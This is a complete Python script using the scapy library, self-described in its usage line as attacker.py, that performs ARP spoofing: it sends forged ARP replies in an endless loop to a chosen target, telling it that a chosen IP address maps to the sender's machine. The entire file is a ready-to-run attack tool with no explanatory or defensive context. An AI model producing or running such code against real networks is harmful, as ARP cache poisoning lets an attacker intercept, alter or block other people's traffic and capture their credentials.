from scapy.all import *
import sys

def arp_spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=getmacbyip(target_ip), psrc=spoof_ip)
    send(packet, loop=1, verbose=1)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python attacker.py <target_ip> <spoof_ip>")
    else:
        arp_spoof(sys.argv[1], sys.argv[2])
